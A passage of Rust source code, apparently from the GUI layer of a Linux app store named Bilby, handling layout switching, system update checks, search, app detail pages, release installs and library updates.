        let section = |title: &str, cards: Vec<AppCard>| Section {
            title: title.into(),
            apps: ModelRc::new(VecModel::from(cards)),
        };
        let (waiting, current): (Vec<AppCard>, Vec<AppCard>) =
            state.library.iter().map(|a| self.library_card(a)).partition(|card| card.has_update);
        let mut tv_library = Vec::new();
        if !waiting.is_empty() {
            tv_library.push(section("Updates available", waiting));
        }
        if !current.is_empty() {
            tv_library.push(section("Installed with Bilby", current));
        }
        if !state.favourites.is_empty() {
            tv_library.push(section("Favourites", state.favourites.iter().map(|f| self.favourite_card(f)).collect()));
        }
        store.set_tv_library_rows(ModelRc::new(VecModel::from(tv_library)));
        // TV home: search results, then the store.
        let mut tv = Vec::new();
        if !results.is_empty() {
            tv.push(Section { title: format!("Results for “{query}”").into(), apps: self.cards(&results) });
        }
        tv.extend(to_sections(&featured));
        store.set_tv_rows(ModelRc::new(VecModel::from(tv)));
    }

    fn refresh_settings(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let settings = self.state().settings;
        store.set_theme_mode(theme_mode(&settings.theme));
        store.set_include_prereleases(settings.include_prereleases);
        store.set_show_ratings(!settings.hide_ratings);
        store.set_check_updates_on_start(!settings.skip_update_check_on_start);
        store.set_has_token(!settings.github_token.trim().is_empty());
        store.set_downloads_dir(self.dirs.downloads.display().to_string().into());
        store.set_show_welcome(!settings.welcomed);
        store.set_interface_mode(interface_mode(&settings.interface));
        store.set_can_register(self.self_program.is_some());
        store.set_in_menu(self.self_program.is_some() && install::self_entry_path(&self.dirs).is_file());
        self.refresh_quota(ui);
    }

    /// Show how much of GitHub's hourly allowance is left, once GitHub has told us.
    fn refresh_quota(&self, ui: &AppWindow) {
        let text = self.catalog().quota().map(|q| q.describe(now_unix())).unwrap_or_default();
        ui.global::<Store>().set_quota_text(text.into());
    }

    fn rebuild_catalog(&self) {
        let settings = self.state().settings;
        let fresh = (self.catalog_factory)(&self.platform.read().unwrap(), &settings, &self.dirs);
        // Ratings fetched earlier stay; the factory hands back a shared catalog, so the
        // old one's are passed on only where that is possible.
        let old = self.catalog();
        let fresh = match Arc::try_unwrap(fresh) {
            Ok(mut catalog) => {
                catalog.share_ratings_with(&old);
                Arc::new(catalog)
            }
            Err(shared) => shared,
        };
        *self.catalog.write().unwrap() = fresh;
    }

    /// Use the desktop or the TV layout, now and from the next start on. `mode` is 0 to
    /// let the store decide, 1 for desktop, 2 for TV.
    pub fn set_interface(self: &Arc<Self>, ui: &AppWindow, mode: i32) {
        let name = ["", "desktop", "tv"].get(mode as usize).copied().unwrap_or("");
        self.update_state(ui, |state| {
            state.settings.interface = name.to_string();
            // Having chosen is an answer to the question, too.
            state.settings.asked_about_tv = true;
        });
        let form = form_for(name, self.detected);
        let changed = {
            let mut platform = self.platform.write().unwrap();
            let changed = platform.form_factor != form;
            platform.form_factor = form;
            changed
        };
        let store = ui.global::<Store>();
        store.set_ask_tv(false);
        store.set_shell(shell_for(form));
        store.set_adaptive(form != FormFactor::Tv);
        // A TV has no use for window borders; a desktop wants them back.
        if !self.inline {
            ui.window().set_fullscreen(form == FormFactor::Tv);
        }
        // The TV layout is designed dark; elsewhere the chosen theme applies.
        let theme = self.theme_override.clone().unwrap_or_else(|| self.state().settings.theme);
        ui.global::<Theme>().set_mode(if form == FormFactor::Tv { 2 } else { theme_mode(&theme) });
        store.set_page(0);
        store.set_details_open(false);
        if changed {
            // What suits a TV differs (TV builds first, websites on Linux), so the lists
            // are fetched again for the new shape.
            self.rebuild_catalog();
            self.collections.lock().unwrap().clear();
            self.load_collections(ui);
            let platform = self.platform.read().unwrap().clone();
            store.set_platform_title(platform.title().into());
            store.set_device_name(platform.friendly().into());
            self.refresh(ui);
        }
        self.refresh_settings(ui);
    }

    /// Keep the store's own app-menu entry in step with the setting: there, and pointing
    /// at the file it is running from, or gone.
    fn apply_menu_entry(&self, ui: &AppWindow) {
        let Some(program) = &self.self_program else { return };
        if self.state().settings.hide_from_menu {
            install::unregister_self(&self.dirs);
        } else if let Err(e) = install::register_self(&self.dirs, program, ICON_PNG) {
            self.toast(ui, &format!("Could not add Bilby to the app menu: {e}"), true);
        }
    }

    /// Fetch the lists the sources keep (what is popular on Flathub and the like) and
    /// add them to the home page. The page is usable before they arrive.
    pub fn load_collections(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        self.job(
            |app| app.catalog().collections(12),
            |app, ui, sections| {
                *app.collections.lock().unwrap() = sections;
                app.refresh(ui);
            },
        );
    }

    // ---- this device ----

    /// Put the system's details and the last look for updates on screen. `state` is
    /// what is going on right now: 0 for "as last found", 1 checking, 4 installing.
    fn show_system(&self, ui: &AppWindow, state: i32, log: &str) {
        let store = ui.global::<Store>();
        let report = &self.system;
        store.set_system_name(report.name.as_str().into());
        store.set_system_tagline(report.tagline.as_str().into());
        store.set_system_facts(ModelRc::new(VecModel::from(
            report
                .facts
                .iter()
                .map(|f| Fact { name: f.name.into(), value: f.value.as_str().into() })
                .collect::<Vec<_>>(),
        )));
        store.set_system_supported(!report.managers.is_empty());
        store.set_system_note(report.note.as_str().into());
        store.set_system_handoff(report.handoff.as_ref().map(|h| h.label).unwrap_or_default().into());
        if !log.is_empty() {
            store.set_system_log(log.into());
        }
        let check = self.system_check.lock().unwrap().clone();
        let pending = check.as_ref().map(|c| c.pending.clone()).unwrap_or_default();
        let rows: Vec<SystemUpdate> = pending
            .iter()
            .map(|p| SystemUpdate {
                name: p.name.as_str().into(),
                change: if p.from.is_empty() { p.to.clone() } else { format!("{} → {}", p.from, p.to) }.into(),
                via: p.manager.label().into(),
            })
            .collect();
        store.set_system_updates(ModelRc::new(VecModel::from(rows)));
        store.set_system_restart(check.as_ref().is_some_and(|c| c.restart_needed));
        let problems = check.as_ref().map(|c| c.problems.join(" ")).unwrap_or_default();
        let (state, headline) = match (state, &check) {
            (1, _) => (1, "Checking for updates…".to_string()),
            (4, _) => (4, "Installing updates…".to_string()),
            (_, None) => (0, "Not checked yet".to_string()),
            (_, Some(_)) if pending.len() == 1 => (3, "1 update available".to_string()),
            (_, Some(_)) if !pending.is_empty() => (3, format!("{} updates available", pending.len())),
            (_, Some(_)) if !problems.is_empty() => (5, "Could not check for updates".to_string()),
            (_, Some(c)) if c.restart_needed => (2, "Restart to finish updating".to_string()),
            (_, Some(_)) => (2, "Up to date".to_string()),
        };
        // Where a check relies on a list fetched earlier, say how old that list is.
        let age =
            check.as_ref().and_then(|c| c.lists_fetched).map(|then| match now_unix().saturating_sub(then) / 3600 {
                0 => "The list of updates was fetched within the last hour.".to_string(),
                hours if hours < 48 => format!("The list of updates was fetched {hours} hours ago."),
                hours => format!("The list of updates was fetched {} days ago, so there may be more.", hours / 24),
            });
        let detail =
            [problems, age.unwrap_or_default()].into_iter().filter(|t| !t.is_empty()).collect::<Vec<_>>().join(" ");
        store.set_system_state(state);
        store.set_system_headline(headline.into());
        store.set_system_detail(detail.into());
    }

    /// Look for system updates. A quiet check (`asked` false) never asks for a
    /// password. One the user asked for first fetches a fresh list of updates where the
    /// one on disk is more than a day old (apt), which does.
    pub fn check_system(self: &Arc<Self>, ui: &AppWindow, asked: bool) {
        if self.system.managers.is_empty() || matches!(ui.global::<Store>().get_system_state(), 1 | 4) {
            return;
        }
        self.show_system(ui, 1, "");
        let fetched = self.system_check.lock().unwrap().as_ref().and_then(|c| c.lists_fetched);
        let stale = asked && fetched.is_some_and(|then| now_unix().saturating_sub(then) > 86_400);
        self.job(
            move |app| {
                let refreshed = match stale {
                    true => bilby_core::os::refresh_lists(app.host.as_ref(), &app.system, &mut |_| {}),
                    false => Ok(()),
                };
                (refreshed, bilby_core::os::check(app.host.as_ref(), &app.system))
            },
            |app, ui, (refreshed, check)| {
                *app.system_check.lock().unwrap() = Some(check);
                app.show_system(ui, 0, "");
                if let Err(e) = refreshed {
                    app.toast(ui, &e.to_string(), true);
                }
            },
        );
    }

    /// Install every waiting system update, then look again.
    pub fn update_system(self: &Arc<Self>, ui: &AppWindow) {
        if self.system.managers.is_empty() || matches!(ui.global::<Store>().get_system_state(), 1 | 4) {
            return;
        }
        self.show_system(ui, 4, "");
        self.job(
            |app| {
                let mut log = Vec::new();
                let result =
                    bilby_core::os::update(app.host.as_ref(), &app.system, &mut |line| log.push(line.to_string()));
                // Long output is cut from the top: the end is where a failure explains itself.
                let from = log.len().saturating_sub(300);
                (result, log[from..].join("\n"), bilby_core::os::check(app.host.as_ref(), &app.system))
            },
            |app, ui, (result, log, check)| {
                let restart = check.restart_needed;
                *app.system_check.lock().unwrap() = Some(check);
                app.show_system(ui, 0, if log.is_empty() { " " } else { &log });
                match result {
                    Ok(()) if restart => app.toast(ui, "Updates installed. Restart this device to finish.", false),
                    Ok(()) => app.toast(ui, "The system is up to date.", false),
                    Err(e) => app.toast(ui, &e.to_string(), true),
                }
            },
        );
    }

    /// Fetch star ratings in the background (at most once a day), unless turned off.
    pub fn load_ratings(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        if self.state().settings.hide_ratings {
            return;
        }
        self.job(
            |app| app.catalog().load_ratings(&app.dirs.cache),
            |app, ui, loaded| {
                if loaded {
                    app.refresh(ui);
                    let store = ui.global::<Store>();
                    if let Some(id) = AppId::parse(store.get_app().id.as_str()) {
                        let rating = app.catalog().rating_for(&id);
                        let mut card = store.get_app();
                        card.rating = rating.map(bilby_core::ratings::stars_text).unwrap_or_default().into();
                        card.rating_count = rating.map(|r| ratings_text(r.count)).unwrap_or_default().into();
                        card.rating_spread = rating.map(spread_shares).unwrap_or_default();
                        store.set_app(card);
                    }
                }
            },
        );
    }

    // ---- search ----

    /// While typing: instant matches from the bundled catalog. No network, no history.
    pub fn typing(&self, ui: &AppWindow, text: &str) {
        let store = ui.global::<Store>();
        let suggestions = self.catalog().suggest(text, 6);
        if !suggestions.is_empty() && !store.get_details_open() {
            store.set_page(1);
        }
        // Old results belong to the previous query; typing starts a new one.
        if store.get_searched() {
            store.set_searched(false);
            store.set_search_note(SharedString::new());
            store.set_search_error(SharedString::new());
            *self.results.lock().unwrap() = (String::new(), Vec::new());
            store.set_results(ModelRc::default());
        }
        store.set_suggestions(self.cards(&suggestions));
    }

    pub fn search(self: &Arc<Self>, ui: &AppWindow, query: &str) {
        let query = query.trim().to_string();
        if query.is_empty() {
            return;
        }
        // A pasted link or owner/repo goes straight to that app.
        if let Some(id) = AppId::from_user_input(&query) {
            if self.catalog().active_sources().contains(&id.source) {
                self.open(ui, &id.to_string());
                return;
            }
        }
        let store = ui.global::<Store>();
        if query.chars().count() < 2 {
            store.set_page(1);
            store.set_search_note("Type at least two characters.".into());
            return;
        }
        self.close_details(ui);
        store.set_page(1);
        store.set_searching(true);
        store.set_search_note(SharedString::new());
        store.set_search_error(SharedString::new());
        self.update_state(ui, |state| state.add_search(&query));
        let generation = self.search_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let work_query = query.clone();
        self.job(
            move |app| app.catalog().search(&work_query),
            move |app, ui, outcome| {
                if app.search_generation.load(Ordering::SeqCst) == generation {
                    app.show_search(ui, &query, &outcome);
                }
            },
        );
    }

    fn show_search(&self, ui: &AppWindow, query: &str, outcome: &SearchOutcome) {
        let store = ui.global::<Store>();
        store.set_searching(false);
        store.set_searched(true);
        // The real results replace the as-you-type suggestions.
        store.set_suggestions(ModelRc::default());
        let mut note = if outcome.apps.is_empty() {
            String::new()
        } else {
            format!("{} for “{query}”.", plural(outcome.apps.len(), "app"))
        };
        if outcome.hidden > 0 {
            if !note.is_empty() {
                note.push(' ');
            }
            note.push_str(&format!("{} more matched but do not work on this device.", outcome.hidden));
        }
        store.set_search_note(note.into());
        store.set_search_error(outcome.errors.join("\n").into());
        *self.results.lock().unwrap() = (query.to_string(), outcome.apps.clone());
        self.refresh(ui);
    }

    // ---- details ----

    /// Install from a list. The app's page opens so what is happening can be seen and
    /// stopped, and the file that suits this device starts downloading as soon as it is
    /// known. Packages that are installed with a command just get their page.
    pub fn quick_install(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        *self.install_when_loaded.lock().unwrap() = Some(id.to_string());
        self.open(ui, id);
    }

    pub fn open(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        let store = ui.global::<Store>();
        let generation = self.details_generation.fetch_add(1, Ordering::SeqCst) + 1;
        // Show what the list already knew while the releases load.
        let known = find_card(&store, id);
        store.set_is_favourite(self.state().is_favourite(id));
        store.set_can_open(self.launchable(id).is_some());
        store.set_in_library(self.state.lock().unwrap().installed(id).is_some());
        store.set_details_open(true);
        store.set_details_error(SharedString::new());
        store.set_unavailable(SharedString::new());
        store.set_warning(SharedString::new());
        store.set_notes(SharedString::new());
        store.set_about(SharedString::new());
        store.set_screenshots(ModelRc::default());
        store.set_reviews(ModelRc::default());
        store.set_release_date(SharedString::new());
        store.set_release_age(SharedString::new());
        store.set_license(SharedString::new());
        store.set_homepage(SharedString::new());
        store.set_options(ModelRc::default());
        store.set_hidden(ModelRc::default());
        store.set_install_state(0);
        store.set_installed_version(
            self.state.lock().unwrap().installed(id).map(|a| a.version.clone()).unwrap_or_default().into(),
        );
        store.set_versions(ModelRc::default());
        store.set_selected_version(0);
        *self.current.lock().unwrap() = Current { id: id.to_string(), details: None, selected: None };
        let mut card = known.unwrap_or_else(|| {
            let name = id.rsplit(['/', ':']).next().unwrap_or(id);
            AppCard {
                id: id.into(),
                name: name.into(),
                source: AppId::parse(id).map(|parsed| parsed.source.label()).unwrap_or_default().into(),
                initials: initials(name).into(),
                tint: tint_for(id),
                icon: picture_for(id),
                ..Default::default()
            }
        });
        // Library cards carry "old → new" as their version; the page shows the release's.
        card.version = SharedString::new();
        store.set_app(card);
        let Some(app_id) = AppId::parse(id) else {
            store.set_details_loading(false);
            store.set_details_error(format!("“{id}” is not an app id.").into());
            return;
        };
        store.set_details_loading(true);
        let about_id = app_id.clone();
        // Taken now, so it applies to this opening only and never to a later visit.
        let auto_install = self.install_when_loaded.lock().unwrap().take();
        self.job(
            move |app| app.catalog().details(&app_id).map_err(|e| e.to_string()),
            move |app, ui, result| {
                if app.details_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                match result {
                    Ok(details) => {
                        let id = details.summary.id.to_string();
                        app.show_details(ui, details);
                        app.load_about(about_id, generation);
                        // Asked for from a list: carry on to the install.
                        let direct = {
                            let current = app.current.lock().unwrap();
                            current
                                .release()
                                .and_then(|r| r.options.first())
                                .is_some_and(|o| o.plan.action != Action::ShowCommand)
                        };
                        if auto_install.as_deref() == Some(id.as_str()) && direct {
                            app.install(ui, 0);
                        }
                    }
                    Err(message) => {
                        let store = ui.global::<Store>();
                        store.set_details_loading(false);
                        store.set_details_error(message.into());
                    }
                }
            },
        );
    }

    /// Fetch the project's own description once the page is usable. It is extra: if it
    /// cannot be had (no README, offline, out of requests) the page simply has no
    /// About section.
    fn load_about(self: &Arc<Self>, id: AppId, generation: u64) {
        let key = bilby_core::icons::app_key(&id);
        let logo_known = PICTURES.with(|p| p.borrow().contains_key(&key));
        self.job(
            move |app| {
                let catalog = app.catalog();
                let http = catalog.http();
                let readme = catalog.about(&id).ok().flatten().unwrap_or_default();
                // Pictures are fetched and decoded here, off the interface's thread. The
                // source's own screenshots first (Flathub has them), else the README's.
                let mut urls = catalog.pictures(&id);
                if urls.is_empty() {
                    urls = bilby_core::screenshots::from_readme(&readme, &id);
                }
                let dir = app.dirs.cache.join("screenshots");
                let pictures = urls
                    .iter()
                    .filter_map(|url| bilby_core::screenshots::fetch(http.as_ref(), &dir, url).ok().flatten())
                    .filter_map(|path| decode_screenshot(&path))
                    .collect();
                // The project's own logo: what its README shows, else the usual places.
                let mut logo = None;
                if !logo_known && id.source == SourceKind::GitHub {
                    let icons = app.dirs.cache.join("icons");
                    let key = bilby_core::icons::app_key(&id);
                    let places = bilby_core::screenshots::logo_from_readme(&readme, &id)
                        .into_iter()
                        .chain(bilby_core::screenshots::usual_logo_places(&id));
                    for (n, url) in places.enumerate() {
                        // Each place is remembered separately, so a miss is not asked again.
                        let attempt = format!("{key}-try{n}");
                        if let Ok(Some(path)) =
                            bilby_core::icons::fetch_picture(http.as_ref(), &icons, &attempt, &url, 2 * 1024 * 1024)
                        {
                            // Kept under the app's own name, where lists look for it.
                            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("png").to_string();
                            let kept = icons.join(format!("{key}.{ext}"));
                            if std::fs::copy(&path, &kept).is_ok() {
                                logo = Some(kept);
                            }
                            break;
                        }
                    }
                }
                // What people wrote, for apps the ratings service knows; none otherwise.
                // Which apps it knows comes from the ratings file, so that is read first
                // (a page opened right at start-up would otherwise find none).
                if !app.state().settings.hide_ratings {
                    catalog.load_ratings(&app.dirs.cache);
                }
                let reviews = catalog.reviews(&id);
                (plain_about(&readme), pictures, logo, reviews)
            },
            move |app,
                  ui,
                  (about, pictures, logo, reviews): (
                String,
                Vec<slint::SharedPixelBuffer<slint::Rgba8Pixel>>,
                Option<PathBuf>,
                Vec<bilby_core::ratings::Review>,
            )| {
                if let Some(image) = logo.as_deref().and_then(decode_picture) {
                    PICTURES.with(|p| p.borrow_mut().insert(key.clone(), image));
                    app.refresh(ui);
                }
                if app.details_generation.load(Ordering::SeqCst) == generation {
                    let store = ui.global::<Store>();
                    store.set_about(about.into());
                    let images: Vec<slint::Image> = pictures.into_iter().map(slint::Image::from_rgba8).collect();
                    store.set_screenshots(ModelRc::new(VecModel::from(images)));
                    let rows: Vec<ReviewRow> = reviews
                        .iter()
                        .map(|r| {
                            let mut meta: Vec<String> = Vec::new();
                            if !r.author.is_empty() {
                                meta.push(r.author.clone());
                            }
                            if !r.date.is_empty() {
                                meta.push(r.date.clone());
                            }
                            if !r.version.is_empty() {
                                meta.push(format!("version {}", r.version));
                            }
                            ReviewRow {
                                stars: format!("{}{}", "★".repeat(r.stars as usize), "☆".repeat(5 - r.stars as usize))
                                    .into(),
                                title: r.title.as_str().into(),
                                text: r.text.as_str().into(),
                                meta: meta.join("  ·  ").into(),
                            }
                        })
                        .collect();
                    store.set_reviews(ModelRc::new(VecModel::from(rows)));
                    let mut card = store.get_app();
                    card.icon = picture_for(&card.id);
                    store.set_app(card);
                }
            },
        );
    }

    fn show_details(&self, ui: &AppWindow, details: AppDetails) {
        let store = ui.global::<Store>();
        store.set_details_loading(false);
        // The list's display name ("Tidewave") reads better than the repository's ("tidewave").
        let mut card = self.card(&details.summary);
        let shown = store.get_app();
        if shown.id == card.id && !shown.name.is_empty() && !shown.author.is_empty() {
            card.name = shown.name;
            card.initials = shown.initials;
            // What the list already knew is kept when the app's own page does not repeat it.
            if card.popularity.is_empty() {
                card.popularity = shown.popularity;
            }
            if card.headline.is_empty() {
                card.headline = shown.headline;
            }
            card.verified |= shown.verified;
        }
        store.set_app(card);
        store.set_license(details.summary.license.clone().unwrap_or_default().into());
        store.set_homepage(details.summary.homepage.as_str().into());
        store.set_unavailable(details.unavailable_reason.clone().unwrap_or_default().into());
        store.set_versions(ModelRc::new(VecModel::from(
            details.versions.iter().map(|r| SharedString::from(&r.version)).collect::<Vec<_>>(),
        )));
        // Installed with a command the person runs: AUR and repository packages. Flathub
        // apps are installed for them, so they read like any other app.
        store.set_is_package(matches!(
            details.summary.id.source,
            SourceKind::Aur | SourceKind::Pacman | SourceKind::Apt | SourceKind::Web
        ));
        store.set_is_website(details.summary.id.source == SourceKind::Web);
        // What the system's package manager has, when the store's own library has nothing.
        if store.get_installed_version().is_empty() {
            store.set_installed_version(details.summary.installed_version.clone().unwrap_or_default().into());
        }
        // Start on the release the catalog picked (the newest stable one that fits).
        let picked = details.release.as_ref().map(|r| r.version.clone());
        let selected = details.versions.iter().position(|r| Some(&r.version) == picked.as_ref());
        {
            let mut current = self.current.lock().unwrap();
            current.details = Some(details);
            current.selected = selected;
        }
        self.show_release(ui);
    }

    /// Fill the page from the release that is currently selected.
    fn show_release(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let current = self.current.lock().unwrap();
        let Some(details) = current.details.as_ref() else { return };
        let release = current.release();
        let (options, hidden, notes, date) = match release {
            Some(r) => (r.options.clone(), r.hidden.clone(), plain_notes(&r.notes), r.published.clone()),
            None => (vec![], vec![], String::new(), String::new()),
        };
        store.set_selected_version(current.selected.unwrap_or(0) as i32);
        let mut card = store.get_app();
        card.version = release.map(|r| r.version.as_str()).unwrap_or_default().into();
        card.badge = options.first().map(|o| o.label()).unwrap_or_default().into();
        store.set_app(card);
        store.set_install_state(0);
        store.set_options(ModelRc::new(VecModel::from(options.iter().map(option_row).collect::<Vec<_>>())));
        store.set_hidden(ModelRc::new(VecModel::from(
            hidden
                .iter()
                .map(|h| HiddenRow { file: h.name.clone().into(), reason: h.reason.clone().into() })
                .collect::<Vec<_>>(),
        )));
        store.set_notes(notes.into());
        // Things worth knowing before installing, most important first.
        let age = age_label(&date, now_unix());
        let mut warnings: Vec<String> = details.summary.warning.clone().into_iter().collect();
        if details.summary.id.source == SourceKind::Web && install::find_longboard(&self.dirs).is_none() {
            warnings.push("Websites open in Longboard, a browser for TVs, which is not installed yet. Install Longboard first: it is under Made for TV.".to_string());
        }
        let newest = details.versions.first().map(|r| r.version.as_str());
        let is_newest = release.map(|r| r.version.as_str()) == newest;
        if let (false, Some(newest)) = (is_newest, newest) {
            warnings.push(format!("This is an older version. The newest for this device is {newest}."));
        }
        if release.is_some_and(|r| r.prerelease && !r.options.is_empty()) {
            warnings.push("This is a pre-release. It may be unfinished or unstable.".to_string());
        }
        if let (true, Some(years)) = (is_newest, age.strip_suffix(" years ago").and_then(|n| n.parse::<u32>().ok())) {
            warnings.push(format!("The latest release is {years} years old. The project may no longer be maintained."));
        }
        store.set_warning(warnings.join("\n").into());
        store.set_release_age(age.into());
        store.set_release_date(date.into());
    }

    pub fn select_version(&self, ui: &AppWindow, index: i32) {
        {
            let mut current = self.current.lock().unwrap();
            let count = current.details.as_ref().map(|d| d.versions.len()).unwrap_or(0);
            if index < 0 || index as usize >= count || ui.global::<Store>().get_install_state() == 1 {
                return;
            }
            current.selected = Some(index as usize);
        }
        self.show_release(ui);
    }

    pub fn close_details(&self, ui: &AppWindow) {
        // Invalidate any details request still in flight.
        self.details_generation.fetch_add(1, Ordering::SeqCst);
        ui.global::<Store>().set_details_open(false);
    }

    // ---- install ----

    /// Update every library app that has an update waiting, one after another. A failure
    /// is reported and the rest carry on.
    pub fn update_all(self: &Arc<Self>, ui: &AppWindow) {
        if !ui.global::<Store>().get_updating_id().is_empty() {
            return;
        }
        let waiting: Vec<String> = {
            let updates = self.updates.lock().unwrap();
            self.state()
                .library
                .iter()
                .filter(|app| matches!(updates.get(&app.id), Some(UpdateStatus::Available { .. })))
                .map(|app| app.id.clone())
                .collect()
        };
        *self.update_queue.lock().unwrap() = waiting.into();
        self.update_next(ui);
    }

    /// Start the next queued update, if any and if nothing is running.
    fn update_next(self: &Arc<Self>, ui: &AppWindow) {
        let store = ui.global::<Store>();
        while store.get_updating_id().is_empty() && store.get_install_state() != 1 {
            let Some(id) = self.update_queue.lock().unwrap().pop_front() else { return };
            self.update_app(ui, &id);
        }
    }

    /// Update a library app in place: look up its newest release for this device and
    /// install the best option, without leaving the Library page.
    pub fn update_app(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 || !store.get_updating_id().is_empty() {
            return;
        }
        let Some(app_id) = AppId::parse(id) else { return };
        let Some(entry) = self.state.lock().unwrap().installed(id).cloned() else { return };
        store.set_updating_id(id.into());
        store.set_install_progress(0.0);
        let id = id.to_string();
        self.job(
            move |app| app.catalog().details(&app_id).map_err(|e| e.to_string()),
            move |app, ui, result| {
                let store = ui.global::<Store>();
                let fail = |message: String| {
                    store.set_updating_id(SharedString::new());
                    app.toast(ui, &message, true);
                    app.update_next(ui);
                };
                let details = match result {
                    Ok(details) => details,
                    Err(e) => return fail(format!("Couldn't update {}: {e}", entry.name)),
                };
                let Some(picked) =
                    details.release.as_ref().filter(|r| !r.options.is_empty()).map(|r| r.version.clone())
                else {
                    return fail(format!("{} no longer has a file for this device", entry.name));
                };
                let selected = details.versions.iter().position(|r| r.version == picked);
                // The install step reads the app in focus; make it this one.
                store.set_app(app.library_card(&entry));
                *app.current.lock().unwrap() = Current { id, details: Some(details), selected };
                app.install(ui, 0);
                // Nothing started (should not happen once an option exists): do not get stuck.
                if store.get_install_state() == 0 && !store.get_updating_id().is_empty() {
                    store.set_updating_id(SharedString::new());
                }
            },
        );
    }

    /// Fetch a file the store would not install on this device. It is checked like any
    /// other download and shown in the downloads folder; nothing is run or recorded.
    pub fn download_hidden(self: &Arc<Self>, ui: &AppWindow, index: i32) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 {
            return;
        }
        let asset = {
            let current = self.current.lock().unwrap();
            let Some(release) = current.release() else { return };
            let Some(hidden) = release.hidden.get(index.max(0) as usize) else { return };
            hidden.asset.clone()
        };
        // Past any real option's index, so no install button takes it for its own.
        store.set_install_index(HIDDEN_BASE + index);
        store.set_install_state(1);
        store.set_install_progress(0.0);
        self.cancel_install.store(false, Ordering::SeqCst);
        let cancel = self.cancel_install.clone();
        self.job(
            move |app| {
                let http = app.catalog().http();
                let mut progress = |_: u64, _: Option<u64>| !cancel.load(Ordering::SeqCst);
                install::execute(
                    &install::save_only(),
                    &asset,
                    http.as_ref(),
                    &app.dirs,
                    app.opener.as_ref(),
                    &mut progress,
                )
            },
            |app, ui, result| {
                ui.global::<Store>().set_install_state(0);
                match result {
                    Ok(outcome) => app.toast(ui, &outcome.message, false),
                    Err(Error::Cancelled) => app.toast(ui, "Download cancelled", false),
                    Err(e) => app.toast(ui, &format!("Download failed: {e}"), true),
                }
            },
        );
    }

    pub fn install(self: &Arc<Self>, ui: &AppWindow, index: i32) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 {
            return;
        }
        let (details, option, version) = {
            let current = self.current.lock().unwrap();
            let Some(details) = current.details.clone() else { return };
            let Some(release) = current.release() else { return };
            let Some(option) = release.options.get(index.max(0) as usize).cloned() else { return };
            (details, option, release.version.clone())
        };
        store.set_install_index(index);
        store.set_install_state(1);
        store.set_install_progress(0.0);
        store.set_install_message(SharedString::new());
        self.cancel_install.store(false, Ordering::SeqCst);

        let cancel = self.cancel_install.clone();
        let inline = self.inline;
        let weak = self.ui.clone();
        let work_option = option.clone();
        self.job(
            move |app| {
                let mut last_percent = 0u64;
                let mut progress = |done: u64, total: Option<u64>| {
                    if let Some(total) = total.filter(|t| *t > 0) {
                        let percent = done * 100 / total;
                        // One UI update per percent is plenty.
                        if percent != last_percent {
                            last_percent = percent;
                            let set =
                                move |ui: AppWindow| ui.global::<Store>().set_install_progress(percent as f32 / 100.0);
                            if inline {
                                if let Some(ui) = weak.upgrade() {
                                    set(ui);
                                }
                            } else {
                                let weak = weak.clone();
                                let _ = slint::invoke_from_event_loop(move || {
                                    if let Some(ui) = weak.upgrade() {
                                        set(ui);
                                    }
                                });
                            }
                        }
                    }
                    !cancel.load(Ordering::SeqCst)
                };
                let http = app.catalog().http();
                install::execute(
                    &work_option.plan,
                    &work_option.asset,
                    http.as_ref(),
                    &app.dirs,
                    app.opener.as_ref(),
                    &mut progress,
                )
            },
            move |app, ui, result| {
                let store = ui.global::<Store>();
                // Started from the Library page rather than an app page?
                let updating_in_place = !store.get_updating_id().is_empty();
                store.set_updating_id(SharedString::new());
                match result {
                    Ok(outcome) => {
                        store.set_install_state(2);
                        store.set_install_message(outcome.message.as_str().into());
                        if option.plan.action == Action::ShowCommand {
                            return;
                        }
                        let name = store.get_app().name.to_string();
                        let mut entry = InstalledApp::new(
                            &details.summary,
                            &version,
                            &option.label(),
                            &option.asset.name,
                            now_unix(),
                        );
                        entry.name = name.clone();
                        entry.path = outcome.file.as_ref().map(|p| p.display().to_string());
                        entry.store_managed = outcome.store_managed;
                        let id = entry.id.clone();
                        if let (true, Some(file)) = (outcome.store_managed, outcome.file.as_ref()) {
                            // Start it from the app menu like anything else that is installed.
                            if install::add_menu_entry(&app.dirs, &id, &name, file).is_ok() {
                                store
                                    .set_install_message(format!("{} It is in your app menu.", outcome.message).into());
                            }
                            // The version this replaces was a different file: do not leave it behind.
                            let previous =
                                app.state().installed(&id).filter(|a| a.store_managed).and_then(|a| a.path.clone());
                            if let Some(previous) = previous.map(PathBuf::from) {
                                if previous != *file && previous.starts_with(&app.dirs.applications) {
                                    let _ = std::fs::remove_file(previous);
                                }
                            }
                        }
                        app.update_state(ui, |state| state.record_install(entry));
                        // Installing an older version on purpose leaves an update pending.
                        let newest = details.versions.first().map(|r| r.version.clone()).unwrap_or_default();
                        let status = if bilby_core::version::is_newer(&newest, &version) {
                            let label = details.versions[0].options.first().map(|o| o.label()).unwrap_or_default();
                            UpdateStatus::Available { version: newest, label }
                        } else {
                            UpdateStatus::UpToDate
                        };
                        app.updates.lock().unwrap().insert(id, status);
                        store.set_installed_version(version.into());
                        app.refresh(ui);
                        if updating_in_place {
                            store.set_install_state(0);
                            app.toast(ui, &format!("{name} updated to {}", store.get_installed_version()), false);
                        } else {
                            app.toast(ui, &format!("{name} is in your library"), false);
                        }
                    }
                    Err(Error::Cancelled) => {
                        store.set_install_state(0);
                        // Cancelling one stops the rest of an "Update all" too.
                        app.update_queue.lock().unwrap().clear();
                        app.toast(ui, "Download cancelled", false);
                    }
                    Err(e) => {
                        if updating_in_place {
                            // There is no app page open to show the message on.
                            store.set_install_state(0);
                            app.toast(ui, &format!("Update failed: {e}"), true);
                        } else {
                            store.set_install_state(3);
                            store.set_install_message(e.to_string().into());
                        }
                    }
                }
                if updating_in_place {
                    app.update_next(ui);
                }
            },
        );
    }

    // ---- library ----

    pub fn check_updates(self: &Arc<Self>, ui: &AppWindow, announce: bool) {
        let store = ui.global::<Store>();
